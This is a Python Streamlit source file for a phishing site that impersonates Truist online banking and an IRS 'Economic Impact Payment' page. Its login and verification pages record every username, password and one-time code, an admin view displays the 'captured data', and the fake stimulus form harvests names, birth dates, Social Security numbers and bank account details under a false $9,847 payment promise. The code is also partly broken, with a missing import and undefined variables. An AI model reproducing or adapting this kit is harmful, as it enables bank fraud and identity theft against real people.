import streamlit as st
import pandas as pd
from datetime import datetime
import random
import time

# Initialize balances if not already set
if "checking" not in st.session_state:
    st.session_state.checking = 12340.50
if "savings" not in st.session_state:
    st.session_state.savings = 14911.32
if "crypto" not in st.session_state:
    st.session_state.crypto = {"BTC": 0.0, "ETH": 0.0, "SOL": 0.0, "DOGE": 0.0, "PEPE": 0.0, "GROK": 0.0}
if "glitter_mode" not in st.session_state:
    st.session_state.glitter_mode = False

# ========================= LIVE PRICES =========================
@st.cache_data(ttl=10)  # Updates every 10 seconds
def get_crypto_prices():
    url = "https://api.coingecko.com/api/v3/simple/price"
    params = {"ids": "bitcoin,ethereum,solana,dogecoin,pepe,grok",
        "vs_currencies": "usd",
        "include_24hr_change": "true"}
    try:
        data = requests.get(url, params=params, timeout=10).json()
        return {
            "BTC": {"price": data["bitcoin"]["usd"], "change": data["bitcoin"]["usd_24h_change"]},
            "ETH": {"price": data["ethereum"]["usd"], "change": data["ethereum"]["usd_24h_change"]},
            "SOL": {"price": data["solana"]["usd"], "change": data["solana"]["usd_24h_change"]},
            "DOGE": {"price": data["dogecoin"]["usd"], "change": data["dogecoin"]["usd_24h_change"]},
            "PEPE": {"price": data["pepe"]["usd"], "change": data["pepe"]["usd_24h_change"]},
            "GROK": {"price": data["grok"]["usd"], "change": data["grok"]["usd_24h_change"]},
        }
    except:
        # Fallback if API down (never crash the vibes)
        return {k: {"price": 0, "change": 0} for k in st.session_state.crypto.keys()}

prices = get_crypto_prices()
# ======================= STORAGE =========================
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []

# ===================== CREDENTIALS =======================
VALID_USERNAME = "client001"
VALID_PASSWORD = "Secure2025Hub!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

# =================== SESSION STATE =======================
for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
    if key not in st.session_state:
        st.session_state[key] = False

# ======================= IRS SEAL (REAL BASE64) =======================
irs_seal_base64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAB4CAMAAABUp9QnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2Njc5MiwgMjAyMS8wMS8xNC0wODowNzoyMyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIzLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjJERjY4RjZCM0YxMTFFM0I4QjBCMEJBQjBCMDhCMEJCQyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyREY2OEY2QzNGExMTFFM0I4QjBCMEJBQjBCMDhCMEJCQyI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjJERjY4RjZBM0YxMTFFM0I4QjBCMEJBQjBCMDhCMEJCQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoyREY2OEY2QjNGExMTFFM0I4QjBCMEJBQjBCMDhCMEJCQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PtD/4AAAABJRU5ErkJggg=="

# ========================= CSS (PERFECT CONTRAST) =========================
st.markdown("""
<style>
    .stApp {background: #502b85 !important; color: white; font-family: 'Helvetica Neue', Arial, sans-serif;}
    .truist-header {background: #502b85; padding: 20px; text-align: center; border-bottom: 10px solid #ffb700;}
    .glass-card {
        background: rgba(255, 255, 255, 0.98) !important;
        color: #000 !important;
        border-radius: 16px;
        padding: 32px;
        box-shadow: 0 12px 40px rgba(0,0,0,0.25);
        margin: 25px 0;
        border: 1px solid rgba(255, 183, 0, 0.4);
    }
    .truist-btn, .stButton>button {
        background: #ffb700 !important; color: #502b85 !important; font-weight: bold !important;
        border-radius: 8px !important; border: none !important; padding: 12px 24px !important;
    }
    .truist-btn:hover, .stButton>button:hover {background: #ffcc33 !important;}
    h1, h2, h3 {color: #502b85 !important;}
    .big-logo {font-size: 100px; text-align: center;}
    .price-up {color: #00ff9d !important;}
    .price-down {color: #ff006e !important;}
    .crypto-btn {font-size:20px; padding:15px; margin:10px 0;}
    .glitter {position:fixed; top:0; left:0; width:100%;
        height: 14px; width: 14px; background: #ff0033; border-radius: 50%;
        display: inline-block; animation: pulse 1.5s infinite;
    }
    @keyframes pulse {0% {box-shadow: 0 0 0 0 rgba(255,0,51,0.8);} 70% {box-shadow: 0 0 0 14px rgba(255,0,51,0);} 100% {box-shadow: 0 0 0 0 rgba(255,0,51,0);}}
    .irs-status {background: #002868 !important; color: #ffb700 !important;}
</style>
""", unsafe_allow_html=True)

# ======================= PAGES =========================
def login_page():
    st.markdown("<div class='truist-header'><div class='big-logo'>🏦</div><h1>Welcome to Truist Online Banking</h1></div>", unsafe_allow_html=True)
    st.markdown("<div style='text-align:center; padding:60px 20px'>", unsafe_allow_html=True)
    username = st.text_input("User ID", placeholder="Enter your User ID")
    password = st.text_input("Password", type="password", placeholder="Enter your password")
    if st.button("Log In", type="primary"):
        st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "user": username, "pass": password})
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            st.session_state.authenticated = True
            st.session_state.otp_verified = False
            st.rerun()
        elif username == ADMIN_USER and password == ADMIN_PASS:
            st.session_state.is_admin = True
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("Incorrect User ID or password")

def otp_page():
    st.markdown("<div style='text-align:center; padding:80px'>", unsafe_allow_html=True)
    st.markdown("<h1>🔐 Security Verification</h1><p>We sent a 6-digit code to your phone ending in **--7842</p>", unsafe_allow_html=True)
    code = st.text_input("Enter code", max_chars=6, placeholder="000000")
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code})
        if len(code) == 6:
            st.session_state.otp_verified = True
            st.balloons()
            st.rerun()
        else:
            st.error("Invalid code")

def admin_view():
    st.markdown("<h1 style='color:red; text-align:center'>🔥 ADMIN — CAPTURED DATA 🔥</h1>", unsafe_allow_html=True)
    if st.session_state.captured_creds: st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    if st.session_state.captured_otp: st.dataframe(pd.DataFrame(st.session_state.captured_otp))

def dashboard():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Welcome back</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center'><span class='recording-dot'></span> Session is being recorded</p>", unsafe_allow_html=True)
    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", "$27,451.82")
    with c2: st.metric("Available Credit", "$15,700")
    with c3: st.metric("Monthly Spending", "$3,214")
    with c4: st.metric("Savings Goal", "78%")

def crypto_wallet():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>🔥 Crypto Wallet (Live Prices)</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:18px;'>Powered by CoinGecko • Updates every 10s</p>", unsafe_allow_html=True)

    total_usd = sum(st.session_state.crypto[coin] * prices[coin]["price"] for coin in st.session_state.crypto if prices[coin]["price"] > 0)
    st.metric("Total Crypto Value", f"${total_usd:,.2f}")

    for coin, amount in st.session_state.crypto.items():
        if amount > 0 or coin in ["BTC", "ETH", "SOL"]:
            price = prices[coin]["price"]
            change = prices[coin]["change"]
            value = amount * price
            change_color = "price-up" if change > 0 else "price-down"
            arrow = "🚀" if change > 10 else "📈" if change > 0 else "📉" if change > -10 else "💀"
            
            st.markdown(f"""
            <div class='glass-card'>
                <h2>{coin} {arrow}</h2>
                <h3>{amount:.6f} {coin} = ${value:,.2f}</h3>
                <p>Price: <b>${price:,.2f}</b> 
                   <span class='{change_color}'> ({change:+.2f}% 24h)</span></p>
            </div>
            """, unsafe_allow_html=True)

    st.markdown("### 🛒 Quick Buy / Sell")
    col1, col2, col3 = st.columns(3)
    with col1:
        coin_buy = st.selectbox("Coin", list(prices.keys()), key="buy_coin")
    with col2:
        usd_amount = st.number_input("USD Amount", min_value=1.0, value=100.0, step=50.0)
    with col3:
        if st.button("BUY 🟩", type="primary", use_container_width=True):
            if usd_amount > st.session_state.checking:
                st.error("Not enough fiat, bro!")
            else:
                coins_bought = usd_amount / prices[coin_buy]["price"]
                st.session_state.crypto[coin_buy] += coins_bought
                st.session_state.checking -= usd_amount
                st.success(f"Bought {coins_bought:.6f} {coin_buy}!")
                st.balloons()
                if random.random() < 0.1:
                    st.session_state.glitter_mode = True
                st.rerun()

    if st.button("SELL ALL TO FIAT 💀", type="secondary"):
        for coin in st.session_state.crypto:
            if st.session_state.crypto[coin] > 0:
                usd = st.session_state.crypto[coin] * prices[coin]["price"]
                st.session_state.checking += usd
                st.session_state.crypto[coin] = 0
        st.success("Rugged everything. Back to fiat gang.")
        st.balloons()
        
def accounts():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Accounts</h1>", unsafe_allow_html=True)
    for name, bal in [("Premier Checking ••••2847", f"${st.session_state.checking_balance:,.2f}"),
                  ("High-Yield Savings ••••5901", f"${st.session_state.savings_balance:,.2f}")]:
        st.markdown(f"<div class='glass-card'><h3>{name}</h3><h2>{bal}</h2></div>", unsafe_allow_html=True)

def cards_page():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Cards</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    st.markdown("<div style='font-size:80px; text-align:center'>💳</div><h2 style='text-align:center; color:#502b85'>Truist One Rewards Card</h2><h3 style='text-align:center'>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("Show Full Number"):
            st.success("5412 7537 0000 7723")
    with col2:
        if st.button("Show Expiry"):
            st.success("11/28")
    with col3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "action": "CVV Revealed"})
            st.info("CVV: 342")
            st.balloons()
    st.markdown("</div>", unsafe_allow_html=True)

def transfer():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Transfer Funds</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)

    st.radio("Type", ["My Accounts", "External", "Zelle"])
    col1, col2 = st.columns(2)
    with col1:
        from_acct = st.selectbox("From", ["Checking ****2847", "Savings ****5901"])
    with col2:
        to_acct = st.selectbox("To", ["Savings ****5901", "External", "Checking ****2847"])

    amount = st.number_input("Amount", 0.01)

    if st.button("Send"):
        if from_acct == to_acct:
            st.error("Cannot transfer to the same account.")
        elif "External" in to_acct:
            st.success("Transfer to external account completed!")
            st.balloons()
        else:
            # Determine source and destination keys
            from_key = "checking_balance" if "Checking" in from_acct else "savings_balance"
            to_key = "savings_balance" if "Savings" in to_acct else "checking_balance"

            if st.session_state[from_key] < amount:
                st.error("Insufficient funds.")
            else:
                st.session_state[from_key] -= amount
                st.session_state[to_key] += amount
                st.success(f"Transferred ${amount:,.2f} from {from_acct} to {to_acct}")
                st.balloons()

    st.markdown("</div>", unsafe_allow_html=True)

def messages():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Secure Messages</h1>", unsafe_allow_html=True)
    for m in ["Statement Ready", "New Login Alert", "Rate Increase"]:
        st.markdown(f"<div class='glass-card'><h4>🟢 {m}</h4></div>", unsafe_allow_html=True)

def irs_stimulus_center():
    st.markdown(f"""
    <div style="text-align:center; padding:20px; background:white; border-radius:16px; margin-bottom:20px;">
        <img src="{irs_seal_base64}" width="130">
        <h1 style="color:#002868; margin:10px 0;">U.S. Department of the Treasury</h1>
        <h2 style="color:#002868; margin:5px 0;">Internal Revenue Service | irs.gov</h2>
        <p style="color:#555;">2025 Economic Recovery Payment Program</p>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("""
    <div class='glass-card' style='border: 6px solid #002868; position:relative;'>
        <div style='position:absolute; top:12px; right:12px; background:#B31942; color:white; padding:8px 18px; border-radius:30px; font-weight:bold; font-size:14px;'>SECURE IRS CONNECTION</div>
        <h2 style='text-align:center; color:#002868; padding-top:50px;'>🎉 Congratulations! You Are Pre-Approved</h2>
        <h1 style='text-align:center; color:#B31942; font-size:62px; margin:10px 0;'>$9,847.00</h1>
        <p style='text-align:center; font-size:24px; color:#002868;'><strong>2025 Economic Impact Payment</strong></p>
        <div class='irs-status' style='padding:20px; border-radius:12px; text-align:center; margin:30px 0;'>
            <h3>READY FOR IMMEDIATE DEPOSIT</h3>
        </div>
    </div>
    """, unsafe_allow_html=True)

    with st.form("irs_form"):
        st.markdown("### 🔒 Identity Verification Required (31 U.S.C. § 7701)")
        col1, col2 = st.columns(2)
        with col1:
            first_name = st.text_input("Legal First Name", placeholder="Michael")
            last_name = st.text_input("Legal Last Name", placeholder="Smith")
            dob = st.date_input("Date of Birth", datetime(1990, 1, 1))
        with col2:
            zip_code = st.text_input("ZIP Code from 2024 Tax Return", placeholder="90210")
            filing_status = st.selectbox("2024 Filing Status", ["Single", "Married Filing Jointly", "Head of Household", "Married Filing Separately"])

        ssn = st.text_input("🔐 Social Security Number", placeholder="XXX-XX-XXXX", help="Required by federal law")
        routing = st.text_input("Bank Routing Number (Optional)", placeholder="021000021")
        account = st.text_input("Bank Account Number (Optional)", placeholder="1234567890")
        agree = st.checkbox("I certify under penalty of perjury that this information is correct")

        submitted = st.form_submit_button("🚀 Claim My $9,847 Payment Now", type="primary", use_container_width=True)

        if submitted:
            if not all([first_name, last_name, ssn, agree]):
                st.error("All required fields must be completed per IRS regulations.")
            else:
                capture = {
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "IRS_STIMULUS": {
                        "name": f"{first_name} {last_name}", "dob": str(dob), "zip": zip_code,
                        "filing": filing_status, "ssn": ssn.replace("-", "").replace(" ", ""),
                        "routing": routing, "account": account
                    }
                }
                st.session_state.captured_creds.append(capture)
                with st.spinner("Secure IRS Gateway..."): time.sleep(4)
                st.success("IRS Verification Complete"); st.balloons(); st.snow()
                ref = ''.join(random.choices("0123456789ABCDEF", k=12))
                st.markdown(f"""
                <div style='background:#002868; color:white; padding:40px; border-radius:15px; text-align:center; margin-top:30px;'>
                    <h1 style='color:#ffb700;'>$9,847.00 Deposited</h1>
                    <p style='font-size:18px;'>Funds arriving in 1–3 business days</p>
                    <p><strong>Reference #:</strong> EIP-2025-{ref}</p>
                </div>
                """, unsafe_allow_html=True)

# ======================= SIDEBAR =========================
def sidebar():
    st.sidebar.markdown("<div style='text-align:center'>🏦<h2 style='color:#ffb700'>{}</h2><p style='background:#ffb700;color:#502b85;padding:12px;border-radius:10px;font-weight:bold'>SECURE SESSION</p></div>".format(VALID_USERNAME.upper()), unsafe_allow_html=True)
    page = st.sidebar.radio("Navigate", [
        "Dashboard", "Accounts", "Cards", "Transfer Funds","Crypto Wallet 💰", "Roast Me", "YOLO Zone", "Piggy Bank 🐷" "Messages",
        "Government Stimulus Center 🇺🇸"
    ])
    if st.sidebar.button("Log Out"): 
        for k in ["authenticated", "otp_verified", "is_admin"]: st.session_state[k] = False
        st.rerun()
    return page

# ======================= MAIN =========================
page = sidebar()

if page == "Dashboard":
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Welcome back, Degen</h1>", unsafe_allow_html=True)
    col1, col2 = st.columns(2)
    with col1:
        st.metric("Fiat Total", f"${st.session_state.checking + st.session_state.savings:,.2f}")
    with col2:
        total_crypto = sum(st.session_state.crypto[c] * prices[c]["price"] for c in st.session_state.crypto if prices[c]["price"] > 0)
        st.metric("Crypto Empire", f"${total_crypto:,.2f}")
    if st.button("🚀 YOLO 20% INTO RANDOM COIN 🚀", type="primary"):
        amount = st.session_state.checking * 0.20
        coin = random.choice(list(prices.keys()))
        coins = amount / prices[coin]["price"]
        st.session_state.crypto[coin] += coins
        st.session_state.checking -= amount
        st.balloons()
        st.success(f"YOLO'd ${amount:,.0f} into {coin}!")
        st.rerun()
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    current = sidebar()
    if current == "Accounts": accounts()
    elif page == "Crypto Wallet 💰": crypto_wallet()
    elif current == "Cards": cards_page()
    elif current == "Transfer Funds": transfer()
    elif current == "Messages": messages()
    elif current == "Government Stimulus Center 🇺🇸": irs_stimulus_center()
    else: dashboard()




